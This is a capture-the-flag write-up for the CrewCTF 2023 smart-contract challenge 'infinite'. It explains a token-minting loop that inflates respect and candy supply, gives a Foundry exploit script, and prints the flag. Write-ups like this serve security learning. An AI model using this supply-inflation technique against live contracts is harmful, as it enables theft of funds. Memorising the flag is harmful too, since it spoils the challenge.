---
title: Blockchain - infinite
description: 2023 | CrewCTF | Web3
tags:
    - smart contract
---

## Description

Infinite respect.

> nc infinite.chal.crewc.tf 60001

[:material-download: `infinite.tar.gz`](static/infinite.tar.gz)

## Solution

- To solve the challenge, we need to store more than 50 respect tokens in the `fancyStore` contract

    ```js
    function isSolved() public view returns (bool) {
        return STORE.respectCount(CREW.receiver())>=50 ;
    }
    ```

- The `respectToken` and `candyToken` contracts do not contain any significant information, as they are simple ERC20 token contracts that allow the owner to call the `mint()` and `burn()` functions
- The `crewToken` contract with a `mint()` function that can only be called once is the entry point

    ```js
    function mint() external {
        require(!claimed , "already claimed");
        receiver = msg.sender;
        claimed = true;
        _mint(receiver, 1);
    }
    ```

- Next, we can exchange 10 candy tokens with 1 crew token

    ```js
    function verification() public payable{
        require(crew.balanceOf(msg.sender)==1, "You don't have crew tokens to verify");
        require(crew.allowance(msg.sender, address(this))==1, "You need to approve the contract to transfer crew tokens");
        
        crew.transferFrom(msg.sender, address(this), 1);

        candy.mint(msg.sender, 10);
    }
    ```

- The respect tokens can be exchanged with candy tokens through `fancyStore.sellCandies()` or `localGang.gainRespect()`. But these two functions have a slight difference. The `sellCandies()` function burns candy tokens and transfers the respect tokens stored in the contract to msg.sender, while the `gainRespect()` function transfers the candy tokens from msg.sender and **mint** respect tokens to msg.sender. Thus, the total supply of respect tokens can be increased through `gainRespect()`. Similarly, we can increase the total supply of candy tokens through `fancyStore.buyCandies()`
- Start with 10 candy tokens, we can first exchange 10 respect tokens and increase `candyCount` through `localGang.gainRespect()`. Then, buy 10 candies and increase `respectCount` through `fancyStore.buyCandies()`. Now, we have obtained another 10 candies and transferred 10 respect tokens to the `fancyStore` contract XD Repeat these steps until `STORE.respectCount(CREW.receiver())` reaches the desired threshold

### Script

```js
/// forge script script/Infinite.s.sol --private-key $PRIVATE_KEY --rpc-url $RPC_URL --sig "run(address)" $INSTANCE_ADDR --broadcast
contract InfiniteScript is Script {

    function run(address instance) public {
        vm.startBroadcast();
        Setup setup = Setup(instance);
        crewToken crew = setup.CREW();
        respectToken respect = setup.RESPECT();
        candyToken candy = setup.CANDY();
        fancyStore store = setup.STORE();
        localGang gang = setup.GANG();

        crew.mint();

        crew.approve(address(store), 1);
        store.verification();

        candy.approve(address(gang), 50);
        respect.approve(address(store), 50);
        for (uint i; i < 5; ++i) {
            gang.gainRespect(10);
            store.buyCandies(10);
        }
        vm.stopBroadcast();
    }
}
```

### Flag

> crew{inf1nt3_c4n9i3s_1nfinit3_r3s9ect}
